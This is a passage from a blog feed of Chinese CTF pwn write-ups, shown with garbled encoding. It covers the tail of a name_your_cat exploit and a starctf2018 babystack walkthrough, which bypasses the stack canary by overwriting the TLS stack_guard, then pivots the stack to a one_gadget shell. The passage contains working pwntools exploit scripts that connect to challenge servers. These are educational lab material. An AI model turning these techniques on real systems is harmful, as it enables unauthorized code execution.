operator">*</span><span class="token comment"># è®¾ç½®ç³»ç»Ÿæ¶æ„, æ‰“å°è°ƒè¯•ä¿¡æ¯</span><span class="token comment"># arch å¯é€‰ : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN è¿œç¨‹ : content = 0, PWN æœ¬åœ° : content = 1</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./wustctf2020_name_your_cat"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># å°†æœ¬åœ°çš„ Linux ç¨‹åºå¯åŠ¨ä¸ºè¿›ç¨‹ io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./wustctf2020_name_your_cat"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># è¿œç¨‹ç¨‹åºçš„ IP å’Œç«¯å£å·</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">25944</span><span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># åªæœ‰æœ¬åœ°æ‰å¯è°ƒè¯•ï¼Œè¿œç¨‹æ— æ³•è°ƒè¯•</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">NameWhich</span><span class="token punctuation">(</span>payload1<span class="token punctuation">,</span> payload2<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Give your name plz: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">:</span>        NameWhich<span class="token punctuation">(</span><span class="token string">b'0'</span><span class="token punctuation">,</span> <span class="token string">b'uf4te'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        NameWhich<span class="token punctuation">(</span><span class="token string">b'7'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ä¸è¿œç¨‹äº¤äº’</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h1><blockquote><p>flag{b953f0db-02fb-41e0-8b8e-11f9a74cc362}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat7.png" alt="ã€wustctf2020ã€‘name_your_cat7.png"></p>]]></content>
    
    
    <summary type="html">é¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯ä¸€ç§æ¯”è¾ƒå°‘è§çš„ Canary Bypass æ–¹æ³•ï¼Œé€šè¿‡æ•°ç»„ä¸‹æ ‡è¶Šç•Œç»•è¿‡ Canary ç›´æ¥ä¿®æ”¹æ ˆä¸Šçš„è¿”å›å€¼</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Bypass" scheme="https://www.uf4te.cn/tags/Bypass/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>ã€Star Ctf 2018ã€‘babystack</title>
    <link href="https://www.uf4te.cn/posts/11e500a1.html"/>
    <id>https://www.uf4te.cn/posts/11e500a1.html</id>
    <published>2024-05-14T07:14:45.000Z</published>
    <updated>2024-06-05T06:36:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ”¶è·"><a href="#æ”¶è·" class="headerlink" title="æ”¶è·"></a>æ”¶è·</h1><ul><li><p><mark>å½“æº¢å‡ºé•¿åº¦å¤Ÿå¤§ä¸”ç¨‹åºåˆ›å»ºäº†å­çº¿ç¨‹æ—¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ TLS ç»“æ„ä½“ä¸­çš„ <code>stack_guard</code> æ¥æ§åˆ¶ Canary</mark></p></li><li><p><mark>GDB è¿›è¡Œå¤šçº¿ç¨‹çš„è°ƒè¯•æ–¹æ³•</mark></p></li><li><p><mark>é€šè¿‡ <code>read()</code> å°† one_gadget å†™åˆ° BSS æ®µä¸Šï¼Œç„¶ååˆ©ç”¨æ ˆè¿ç§»æ‰§è¡Œ one_gadget</mark></p></li><li><p>å¦‚æœå‘ç°æˆåŠŸæ„é€  <code>system(&quot;/bin/sh&quot;)</code> åä»å‡ºç°é”™è¯¯ï¼Œå°è¯•ä½¿ç”¨ one_gadget æˆ–è€… ret2syscall æ„é€  <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> æ¥ getshell</p></li></ul><hr><p><a href="https://buuoj.cn/challenges#starctf2018_babystack">ã€Star Ctf 2018ã€‘babystack</a></p><hr><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>æŸ¥çœ‹ç¨‹åºä¿æŠ¤ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack1.png" alt="ã€starctf2018ã€‘babystack1.png"></p><p>å·²çŸ¥ Glibc ç‰ˆæœ¬ä¸º 2.27</p><p>å°è¯•è¿è¡Œï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack2.png" alt="ã€starctf2018ã€‘babystack2.png"></p><p>IDA ä¸‹åˆ†æï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack3.png" alt="ã€starctf2018ã€‘babystack3.png"></p><p>ç¨‹åºé€šè¿‡ <code>pthread_create(newthread, 0LL, start_routine, 0LL);</code> åˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹</p><blockquote><p>æ³¨æ„ï¼Œå…³äºçº¿ç¨‹å‡½æ•°çš„ä¸€ç‚¹è¯´æ˜ï¼š</p><p><code>pthread_create</code> ç”¨äºåˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œ<code>pthread_join</code> ä½¿ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹ç»“æŸ</p><p>å¦‚æœæ²¡æœ‰ <code>pthread_join</code> çš„è¯ï¼Œä¸»çº¿ç¨‹ä¼šå¾ˆå¿«ç»“æŸä»è€Œä½¿æ•´ä¸ªè¿›ç¨‹ç»“æŸï¼Œåˆ›å»ºçš„çº¿ç¨‹è¿˜æ²¡æœ‰æœºä¼šæ‰§è¡Œæ•´ä¸ªçº¿ç¨‹å°±å·²ç»ç»“æŸäº†</p><p>ä½¿ç”¨äº† <code>pthread_join</code> åï¼Œä¸»çº¿ç¨‹ä¼šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°ç­‰å¾…çš„çº¿ç¨‹ç»“æŸåä¸»çº¿ç¨‹æ‰ä¼šç»“æŸï¼Œä½¿åˆ›å»ºçš„çº¿ç¨‹æœ‰æœºä¼šæ‰§è¡Œ</p></blockquote><p>çº¿ç¨‹ä» <code>start_routine()</code> å‡½æ•°å¼€å§‹æ‰§è¡Œï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack4.png" alt="ã€starctf2018ã€‘babystack4.png"></p><p>é¦–å…ˆé€šè¿‡ <code>sub_400906()</code> è·å–ç”¨æˆ·è¾“å…¥ï¼Œè¿™ä¸ªè¾“å…¥è¡¨ç¤ºæˆ‘ä»¬æƒ³è¦å‘é€å¤šå°‘å­—èŠ‚çš„æ•°æ®ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack5.png" alt="ã€starctf2018ã€‘babystack5.png"></p><p>è¿™é‡Œçš„ <code>atol()</code> å‡½æ•°å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²è½¬æ¢æˆä¸€ä¸ªé•¿æ•´æ•°ï¼Œè¿”å›ç»™ <code>v2</code></p><p>å¦‚æœ <code>v2 &lt;= 0x10000</code>ï¼Œå°±è°ƒç”¨ <code>sub_400957(0LL, s, v2);</code> è®©æˆ‘ä»¬å‘ <code>s</code> ä¸­è¾“å…¥æ•°æ®</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack6.png" alt="ã€starctf2018ã€‘babystack6.png"></p><p>æ³¨æ„åˆ° <code>memset(s, 0, 0x1000uLL);</code> ä¸º <code>s</code> åˆå§‹åŒ–çš„ç©ºé—´é•¿åº¦ä¸º <code>0x1000</code>ï¼Œè¿œè¿œå°äº <code>0x10000</code>ï¼Œå› æ­¤æ˜¯å­˜åœ¨æº¢å‡ºçš„</p><p>è¿™é‡Œæº¢å‡ºçš„é•¿åº¦éå¸¸å¤§ï¼Œæˆ‘ä»¬å¯ä»¥è¦†ç›–å¾ˆå¤šå†…å®¹</p><p>ç”±äº Canary çš„ç”Ÿæˆæ˜¯åœ¨ç¨‹åºçš„å‡½æ•°å…¥å£å¤„ä» GS æ®µï¼ˆ32 ä½ï¼‰æˆ– FS æ®µï¼ˆ64 ä½ï¼‰å†…è·å–ä¸€ä¸ªéšæœºå€¼ï¼Œå¯ä»¥åœ¨ IDA ä¸­çœ‹åˆ°å¯¹åº”ä½ç½®ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B613.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶13.png"></p><p>æ ˆä¸Šçš„ Canary çš„å€¼å…¶å®æ¥è‡ªäº TLSï¼ˆThread Local Storageï¼‰ï¼Œåœ¨ 64 ä½ç¨‹åºä¸­ï¼ŒTLS ç”±Â FS å¯„å­˜å™¨æŒ‡å‘ï¼Œå› æ­¤è¿™é‡Œçš„ <code>fs:28h</code> å…¶å®æ˜¯ Canary åœ¨ TLS ä¸­çš„åç§»</p><blockquote><p>å½“ç¨‹åºåˆ›å»ºçº¿ç¨‹çš„æ—¶å€™ï¼Œä¼šé¡ºä¾¿åˆ›å»ºä¸€ä¸ª TLS ç”¨æ¥å­˜å‚¨çº¿ç¨‹ç§æœ‰çš„æ•°æ®ï¼Œè¯¥ TLS ä¹Ÿä¼šå­˜å‚¨ Canary çš„å€¼ï¼Œè€Œ TLS ä¼šä¿å­˜åœ¨æ ˆçš„é«˜åœ°å€å¤„ <strong>ï¼ˆè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¯´åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„ä¸åŒçº¿ç¨‹çš„ Canary æ˜¯ç›¸åŒçš„ï¼‰</strong></p></blockquote><p>å› æ­¤ï¼Œæˆ‘ä»¬åªè¦è¦†ç›– TLS ä¸­ Canary çš„å€¼ï¼Œé‚£ä¹ˆæ•´ä¸ªç¨‹åºçš„ Canary çš„å€¼å°±æ˜¯ç”±æˆ‘ä»¬æ¥å®šçš„äº†</p><p>æ¥ä¸‹æ¥å°±æ˜¯åŠ¨æ€è°ƒè¯•ç¡®å®šåç§»é‡äº†</p><blockquote><p>æ³¨æ„ï¼Œè¿™é‡Œæ¶‰åŠåˆ°å¤šçº¿ç¨‹ï¼Œéœ€è¦è¿›è¡Œå¤šçº¿ç¨‹çš„ GDB åŠ¨æ€è°ƒè¯•ï¼Œå¦‚æœä¸ç†Ÿæ‚‰çš„è¯ï¼Œå¯ä»¥çœ‹çœ‹æœ¬ç«™ã€Š<a href="GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A8.md">GDBçš„åŸºç¡€å’Œä½¿ç”¨</a>ã€‹ä¸€æ–‡ä¸­çš„ <em>ã€Špthread å¤šçº¿ç¨‹è°ƒè¯•ã€‹</em> éƒ¨åˆ†</p></blockquote><p>ä¸ºäº†ä¾¿äºæˆ‘ä»¬è°ƒè¯•ï¼Œæˆ‘ä»¬é¦–å…ˆåœ¨å­çº¿ç¨‹çš„ <code>start_routine()</code> ä¸­ä¸‹å¥½æ–­ç‚¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">b *0x4009E7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack8.png" alt="ã€starctf2018ã€‘babystack8.png"></p><p>GDB å°±è‡ªåŠ¨è°ƒè¯•åˆ°å­çº¿ç¨‹ä¸­äº†ï¼Œä¸€ç›´åˆ° <code>sub_400906()</code> è®©æˆ‘ä»¬è¾“å…¥é•¿åº¦æ—¶ï¼Œè¾“å…¥å¤§ä¸€ç‚¹ï¼Œæˆ‘è¿™é‡Œè¾“å…¥ <code>0x3000</code></p><p>ä½†æ˜¯å‘ç°å¥½åƒç¬¬äºŒæ¬¡åœ¨ <code>sub_400957(0, s, v2);</code> ä¸­çš„è¾“å…¥è¢«è·³è¿‡äº†</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack9.png" alt="ã€starctf2018ã€‘babystack9.png"></p><p>ç”±äºæˆ‘ä»¬ä¹Ÿæ²¡åŠæ³•è¾“å…¥å›è½¦ç¬¦ã€æ¢è¡Œç¬¦ï¼Œå› æ­¤ç”¨è„šæœ¬æ¥æµ‹è¯•</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"How many bytes do you want to send?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'aaaaaaaa'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿›å…¥è°ƒè¯•åï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å°†è°ƒè¯•çš„çº¿ç¨‹åˆ‡æ¢åˆ°å­çº¿ç¨‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> thread <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åæ­£å¸¸è°ƒè¯•å‘é€ payloadï¼ŒæŸ¥çœ‹æ ˆä¸­çš„å¸ƒå±€ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack10.png" alt="ã€starctf2018ã€‘babystack10.png"></p><p>æˆ‘ä»¬è¾“å…¥çš„æ•°æ®åœ¨ <code>0x7f97df1fdee0</code> åœ°å€å¤„</p><p>GDB è·å–å­çº¿ç¨‹çš„ TLS åœ¨æ ˆä¸Šçš„é¦–åœ°å€ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/x pthread_self<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”±äº Canary åœ¨ TLS ä¸­åç§» <code>0x28</code> çš„ä½ç½®ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack11.png" alt="ã€starctf2018ã€‘babystack11.png"></p><p>äºæ˜¯æˆ‘ä»¬è¾“å…¥çš„ä½ç½®è·ç¦» TLS ä¸­ Canary çš„ä½ç½®ï¼š<code>(0x7f97df1ff700 + 0x28) - 0x7f97df1fdee0 = 0x1848</code> å­—èŠ‚</p><p>å› æ­¤æˆ‘ä»¬è‡³å°‘éœ€è¦æº¢å‡º <code>0x1848 + 0x8 = 0x1850</code> å­—èŠ‚</p><p>è™½ç„¶ç¨‹åºæ²¡æœ‰å¼€ PIEï¼Œä½†ä¹Ÿæ²¡æœ‰ <code>system()</code> å’Œ <code>b&#39;/bin/sh&#39;</code>ï¼Œå› æ­¤æˆ‘ä»¬è¿˜æ˜¯éœ€è¦é€šè¿‡ libc åç§»è¿›è¡Œè®¡ç®—ï¼Œè¿™é‡Œé€‰æ‹©å…ˆä½¿ç”¨ <code>puts_plt_addr</code> è¾“å‡º <code>puts_got_addr</code> æ³„éœ² <code>puts()</code> çš„çœŸå®åœ°å€</p><p>åŒæ—¶ï¼Œè¿™é‡Œåªæœ‰ä¸€æ¬¡æœºä¼š</p><blockquote><p>åæ­£æˆ‘å°è¯•è®©ç¨‹åºæ‰§è¡Œæµå›åˆ° <code>start_routine()</code> æˆ–è€… <code>main()</code> åï¼Œåœ¨ç¬¬äºŒæ¬¡å‘é€ payload æ—¶éƒ½ä¼šå¯¼è‡´ç¨‹åºå´©æºƒ</p></blockquote><p>å› æ­¤ï¼Œæœ€åé€‰æ‹©é¦–å…ˆé€šè¿‡ <code>read()</code> å°† <code>system(&quot;/bin/sh&quot;)</code> å†™åˆ°ä¸€ä¸ªå¯å†™å…¥çš„åœ°æ–¹ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯ BSS æ®µé¦–åœ°å€çš„ä¸‹ä¸€åœ°å€ <code>target_addr</code> å¤„</p><p>ç„¶ååˆ©ç”¨ <code>leave; ret</code> æŒ‡ä»¤å®ç°æ ˆè¿ç§»</p><p>å…¶ä¸­ <code>leave</code> æŒ‡ä»¤å°† EBP è¿ç§»åˆ° <code>target_addr - 8</code> çš„åœ°æ–¹ï¼ˆå³ï¼šBSS æ®µçš„é¦–åœ°å€å¤„ï¼‰ï¼Œç”±äºå‡ºæ ˆæ“ä½œä½¿ RSP + 8 è®© RSP æŒ‡å‘ <code>target_addr</code> çš„ä½ç½®</p><p>ç„¶åé€šè¿‡ <code>ret</code> æŒ‡ä»¤æ‰§è¡Œæˆ‘ä»¬å†™åœ¨ BSS æ®µä¸Šçš„ <code>system(&quot;/bin/sh&quot;)</code></p><blockquote><p><strong>å…¶å®åªè¦ä¿è¯ <code>read()</code> å†™å…¥çš„åœ°æ–¹åœ¨ EBP è¿ç§»è¿‡å»çš„åœ°å€çš„ä¸‹ä¸€åœ°å€å¤„å³å¯</strong></p><p>å¦‚æœå¯¹æ ˆè¿ç§»çš„æµç¨‹ä¸å¤ªæ¸…æ¥šï¼Œå¯ä»¥æŸ¥çœ‹æœ¬ç«™ã€Š<a href="%E6%A0%88%E8%BF%81%E7%A7%BB.md">æ ˆè¿ç§»</a>ã€‹ä¸€æ–‡çš„ <em>ã€Šå¯ä»¥è¦†ç›–åˆ°è¿”å›åœ°å€ã€‹</em> éƒ¨åˆ†</p></blockquote><p>ä½†å®é™…æ“ä½œæ—¶å‘ç°ï¼Œæˆ‘ä»¬ç¡®å®å·²ç»æˆåŠŸæ„é€ äº† <code>system(&quot;/bin/sh&quot;)</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack12.png" alt="ã€starctf2018ã€‘babystack12.png"></p><p>ä½†æ˜¯ä¼šåœ¨ <code>do_system()</code> ä¸­å‘ç”Ÿæ®µé”™è¯¯ï¼Œå¯¼è‡´æ— æ³• getshell</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack13.png" alt="ã€starctf2018ã€‘babystack13.png"></p><p>æš‚æ—¶ä¸çŸ¥é“é”™è¯¯å‘ç”Ÿçš„åŸå› </p><p>ä½†æ˜¯é€šè¿‡ one_gadget æ‰§è¡Œ <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> æ˜¯å¯ä»¥ getshell çš„</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack14.png" alt="ã€starctf2018ã€‘babystack14.png"></p><p>è¿™å‡ ä¸ªéƒ½å°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç° <code>one_gadget_libc = 0x4f322</code> æ˜¯å¯ä»¥çš„</p><hr><h1 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># è®¾ç½®ç³»ç»Ÿæ¶æ„, æ‰“å°è°ƒè¯•ä¿¡æ¯</span><span class="token comment"># arch å¯é€‰ : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN è¿œç¨‹ : content = 0, PWN æœ¬åœ° : content = 1</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bs'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/opt/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># å°†æœ¬åœ°çš„ Linux ç¨‹åºå¯åŠ¨ä¸ºè¿›ç¨‹ io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bs"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># è¿œç¨‹ç¨‹åºçš„ IP å’Œç«¯å£å·</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">26929</span><span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># åªæœ‰æœ¬åœ°æ‰å¯è°ƒè¯•ï¼Œè¿œç¨‹æ— æ³•è°ƒè¯•</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>bss_start <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bss_start -->"</span><span class="token punctuation">,</span> bss_start<span class="token punctuation">)</span>target_addr <span class="token operator">=</span> bss_start <span class="token operator">+</span> <span class="token number">0x8</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"target_addr -->"</span><span class="token punctuation">,</span> target_addr<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400c03</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x400c01</span>leave_ret <span class="token operator">=</span> <span class="token number">0x400955</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>read_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>offset <span class="token operator">=</span> <span class="token number">0x1850</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"How many bytes do you want to send?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># æ„é€  payload è‡³å°‘éœ€è¦ 0x1850 çš„é•¿åº¦</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1008</span>   <span class="token comment"># å¡«å…… 0x1008 ä¸ªåƒåœ¾æ•°æ®åˆ°è¾¾ Canary</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>   <span class="token comment"># 0xdeadbeef æ˜¯è¢«æˆ‘ä»¬ä¿®æ”¹åçš„ Canary</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>target_addr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span>   <span class="token comment"># å½“å‰ rbp çš„ä½ç½®ï¼Œå¡«å†™æ ˆè¿ç§»çš„åœ°å€</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x1848</span><span class="token punctuation">,</span> <span class="token string">b"a"</span><span class="token punctuation">)</span>   <span class="token comment"># é•¿åº¦å¡«å……åˆ° 0x1848 åˆ°è¾¾ TLS ä¸­ Canary çš„ä½ç½®</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>   <span class="token comment"># ä¿®æ”¹ TLS ä¸­çš„ stack_guardï¼Œä¹Ÿå°±æ˜¯ Canary</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>   <span class="token comment"># payload é•¿åº¦åˆšå¥½ 0x1850ï¼Œå› æ­¤ä¸è¦ç”¨ sendline</span>io<span class="token 